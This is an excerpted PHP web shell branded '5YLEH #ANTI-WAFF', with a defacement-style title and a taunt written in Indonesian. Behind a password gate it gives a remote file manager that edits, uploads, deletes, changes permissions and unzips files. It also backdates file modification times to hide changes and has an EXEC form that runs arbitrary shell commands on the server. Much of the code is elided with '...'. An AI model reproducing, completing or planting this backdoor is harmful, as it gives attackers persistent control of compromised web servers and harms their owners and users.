...
$hashed_password = '$2a$12$fVLLU0bTzmXCRwnBhXFs7ugR7XjCKfB8mEyPrzN0n67qTz1C5D8yO';
...
<head>
  ...
  <title>5YLEH HERE.!!</title>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body{background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;}
    .login-box{background:#161b24;border:1px solid #2a3040;border-radius:8px;padding:2.5rem 2rem;width:320px;text-align:center;}
    .login-box h1{color:#00e80f;font-size:1.4rem;margin-bottom:.3rem;letter-spacing:2px;}
    .login-box p{color:#5a6478;font-size:.75rem;margin-bottom:1.8rem;}
    input[type=password]{width:100%;background:#0d0f14;border:1px solid #2a3040;border-radius:4px;padding:.7rem 1rem;color:#c8d0e0;font-family:'JetBrains Mono',monospace;font-size:.85rem;outline:none;transition:border .2s;}
    input[type=password]:focus{border-color:#00e80f;}
    button{margin-top:1rem;width:100%;background:#00e80f;color:#0d0f14;border:none;border-radius:4px;padding:.7rem;font-family:'JetBrains Mono',monospace;font-weight:700;font-size:.9rem;cursor:pointer;letter-spacing:1px;transition:opacity .2s;}
...
<video autoplay muted loop playsinline id="bg-video">
  ...
  <div class="login-box">
    <h1>5YLEH HERE.!!</h1>
    <h2><span style="color: #f7f3f3;">HAI</span></h2>
    <h2><span style="color: #ff2200;">ORANG ORANG MUNAFIK</span></h2>
    <form method="post">
      <input type="password" name="password" placeholder="ENTER YOUR PASWORD" autofocus required>
...
if ($type == 3) {
    ...
    $alert = ($content_result !== false)
        ? '<div class="alert alert-success">âœ” File content modified successfully!</div>'
        : '<div class="alert alert-danger">âœ˜ Failed to modify file content!</div>';
}

if ($type == 4 && !empty($_POST['file_new_name'])) {
    $file_new_name = $_POST['file_new_name'];
    if (rename($file_path, $now_path . '/' . $file_new_name)) {
        $alert     = '<div class="alert alert-success">âœ” Renamed successfully!</div>';
        $file_path = $now_path . '/' . $file_new_name;
    } else {
        $alert = '<div class="alert alert-danger">âœ˜ Failed to rename!</div>';
    }
}
...
if ($type == 5) {
    if (!empty($_POST['new_chmod'])) {
        ...
        $alert = chmod($file_path, octdec($new_chmod))
            ? '<div class="alert alert-success">âœ” Permissions changed successfully!</div>'
            : '<div class="alert alert-danger">âœ˜ Failed to change permissions!</div>';
        $old_chmod = $new_chmod;
    } else {
...
if ($type == 6) {
    ...
    if (!empty($new_name)) {
        if (is_file($now_path . '/' . $new_name)) {
            $alert = '<div class="alert alert-danger">âœ˜ File already exists!</div>';
        } else {
            $fp = fopen($now_path . '/' . $new_name, 'w');
            if ($fp) { fwrite($fp, $new_content); fclose($fp);
                $alert = '<div class="alert alert-success">âœ” File created successfully!</div>';
            } else {
                $alert = '<div class="alert alert-danger">âœ˜ Failed to create file!</div>';
            }
        }
    }
}
...
if ($type == 7) {
    ...
    if (!empty($new_name)) {
        ...
        if (is_dir($target_dir))     $alert = '<div class="alert alert-warning">âš  Directory already exists!</div>';
        elseif (mkdir($target_dir))  $alert = '<div class="alert alert-success">âœ” Directory created successfully!</div>';
        else                         $alert = '<div class="alert alert-danger">âœ˜ Failed to create directory!</div>';
    }
}

if ($type == 8 && !empty($_POST['new_datetime'])) {
    $timestamp = strtotime(trim($_POST['new_datetime']));
    if ($timestamp === false)             $alert = '<div class="alert alert-danger">âœ˜ Invalid date/time format!</div>';
    elseif (touch($file_path,$timestamp)) $alert = '<div class="alert alert-success">âœ” Modification time changed!</div>';
    else                                  $alert = '<div class="alert alert-danger">âœ˜ Failed to change time!</div>';
}
...
if ($type == 9 && isset($_POST['extract_to'])) {
    ...
    if ($result === true) {
        $alert = $zip->extractTo($extract_to)
            ? '<div class="alert alert-success">âœ” Extracted to: ' . htmlspecialchars($extract_to) . '</div>'
            : '<div class="alert alert-danger">âœ˜ Failed to extract!</div>';
        $zip->close();
    } else {
        $alert = '<div class="alert alert-danger">âœ˜ Cannot open ZIP! Error: ' . $result . '</div>';
    }
}
...
if ($type == 10) {
    ...
    if (!empty($target) && file_exists($target)) {
        ...
        $alert = $del_result
            ? '<div class="alert alert-success">âœ” <strong>' . htmlspecialchars(basename($target)) . '</strong> deleted!</div>'
            : '<div class="alert alert-danger">âœ˜ Failed to delete!</div>';
    } else {
        $alert = '<div class="alert alert-danger">âœ˜ Item not found!</div>';
    }
}
...
if ($type == '' || $type == 1) {
    if (isset($_POST['act']) && $_POST['act'] === 'del' && !empty($_POST['childcheck'])) {
        ...
        if ($count) $alert .= '<div class="alert alert-success">âœ” Deleted ' . $count . ' item(s)!</div>';
        if ($fail)  $alert .= '<div class="alert alert-danger">âœ˜ Failed to delete ' . $fail . ' item(s)!</div>';
    }
    if (isset($_POST['act']) && $_POST['act'] === 'upload' && !empty($_FILES['fileToUpload']['name'])) {
        ...
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile))
            $alert .= '<div class="alert alert-success">âœ” ' . htmlspecialchars(basename($_FILES['fileToUpload']['name'])) . ' uploaded!</div>';
        else
            $alert .= '<div class="alert alert-danger">âœ˜ Upload failed!</div>';
    }
}
...
if (isset($_POST['act']) && $_POST['act'] === 'exec' && !empty($_POST['cmd'])) {
    ...
    // âœ… CRITICAL: Change to target directory FIRST
    if (is_dir($target_dir) && chdir($target_dir)) {
        $current_cwd = getcwd();
        $alert .= '<div class="alert alert-info small mb-2">';
        $alert .= 'ðŸ“ Working dir: <code>' . htmlspecialchars($current_cwd) . '</code>';
        $alert .= '</div>';
    }
    ...
    if ($used_method) {
        ...
        $alert .= 'âœ˜ No working exec method found!<br>';
...
<div class="layout">
  ...
  <!-- ===== SIDEBAR ===== -->
  <aside class="sidebar">
    <div class="sidebar-logo">5YLEH<span>#ANTI-WAFF</span></div>
  ...
  <div class="main">
    ...
    <div class="topbar">
      ...
      <div class="topbar-actions">
        <a class="home-btn" href="?path=<?php echo htmlspecialchars(dirname($data['SCRIPT_FILENAME'])); ?>">ðŸ  Home</a>
      ...
      <div class="topbar-toolbar">
        ...
        <div class="topbar-toolbar-row">
          <form action="?path=<?php echo htmlspecialchars($file_path); ?>" method="post" enctype="multipart/form-data">
            ...
            <button type="submit" class="btn btn-upload">â¬† Upload</button>
          </form>
          <a class="btn btn-accent" href="?path=<?php echo htmlspecialchars($file_path); ?>&type=6">ðŸ“„ New File</a>
          <a class="btn btn-blue"   href="?path=<?php echo htmlspecialchars($file_path); ?>&type=7">ðŸ“ New Folder</a>
        </div>
        <!-- Baris TERMINAL EXEC -->
        <div class="topbar-toolbar-row">
          <form action="?path=<?php echo htmlspecialchars($file_path); ?>" method="post" style="display:flex;align-items:center;gap:.4rem;">
            ...
            <button type="submit" class="btn btn-accent" style="padding:.3rem .8rem;font-size:12px;">âš¡ EXEC</button>
          </form>
        </div>
        ...
        <div class="topbar-toolbar-row">
          <form action="?path=<?php echo htmlspecialchars($file_path); ?>" method="post" id="del-top-form">
            ...
            <button type="submit" class="btn btn-danger" onclick="syncCheckboxes(); return confirm('Delete selected items?')">ðŸ—‘ Delete Selected</button>
          </form>
        </div>
      </div>
      <?php endif; ?>
    ...
    <div class="zhyper-db-body">
      ...
      <div class="form-card">
        <h4>âœï¸ Edit File â€” <span><?php echo htmlspecialchars(basename($file_path)); ?></span></h4>
        <form action="?type=3" method="post">
          ...
          <div class="form-actions">
            <button type="submit" class="btn btn-accent">ðŸ’¾ Save</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($now_path); ?>">âœ• Cancel</a>
          </div>
        </form>
      </div>
      ...
      <?php elseif ($type == 4): ?>
      <div class="form-card">
        <h4>âœï¸ Rename â€” <span><?php echo htmlspecialchars(basename($file_path)); ?></span></h4>
        <form action="?type=4" method="post">
          ...
          <div class="form-actions">
            <button type="submit" class="btn btn-accent">âœ” Rename</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($now_path); ?>">âœ• Cancel</a>
          </div>
        </form>
      </div>
      ...
      <?php elseif ($type == 5): ?>
      <div class="form-card">
        <h4>ðŸ”’ Change Permission â€” <span><?php echo htmlspecialchars(basename($file_path)); ?></span></h4>
        <form action="?type=5" method="post">
          ...
          <div class="form-actions">
            <button type="submit" class="btn btn-warn">âœ” Change</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($now_path); ?>">âœ• Cancel</a>
          </div>
        </form>
      </div>
      ...
      <div class="form-card">
        ...
        <form action="?type=6" method="post">
          ...
          <div class="form-actions">
            <button type="submit" class="btn btn-accent">âœ” Create</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($file_path); ?>">âœ• Cancel</a>
          </div>
        </form>
      </div>
      ...
      <?php elseif ($type == 8): ?>
      <div class="form-card">
        <h4>ðŸ• Change Modification Time â€” <span><?php echo htmlspecialchars(basename($file_path)); ?></span></h4>
        <form action="?type=8" method="post">
          ...
          <div class="form-actions">
            <button type="submit" class="btn btn-blue">âœ” Change</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($now_path); ?>">âœ• Cancel</a>
          </div>
        </form>
      </div>
      ...
      <?php elseif ($type == 9): ?>
      <div class="form-card">
        <h4>ðŸ“¦ Unzip â€” <span><?php echo htmlspecialchars(basename($file_path)); ?></span></h4>
        <form action="?type=9" method="post">
          ...
          <div class="form-actions">
            <button type="submit" class="btn btn-warn">ðŸ“¦ Extract Now</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($now_path); ?>">âœ• Cancel</a>
          </div>
        </form>
      </div>
      ...
      <div class="alert alert-success">â†© Redirecting back...</div>
      ...
      <form action="?path=<?php echo htmlspecialchars($file_path); ?>" method="post" id="bulk-form">
        ...
        <div class="file-table-wrap">
          <table>
              ...
              <tr>
                ...
                <td>
                  <?php $visit_url = (strpos($file_url, $website_path) === 0) 
                      ...
                      : ''; ?>
                  <?php if ($visit_url): ?>
                    <a class="url-link" href="<?php echo $visit_url; ?>" target="_blank">â†— visit</a>
                  <?php else: ?>
                    <span class="url-link" style="opacity:.4;">â€”</span>
                  <?php endif; ?>
                </td>
            ...
            <?php endforeach; ?>
            <?php if (!$has_files): ?>
              <tr><td colspan="8" class="empty-state">â€” No files in this directory â€”</td></tr>
            <?php endif; ?>
            </tbody>
          </table>
        </div>
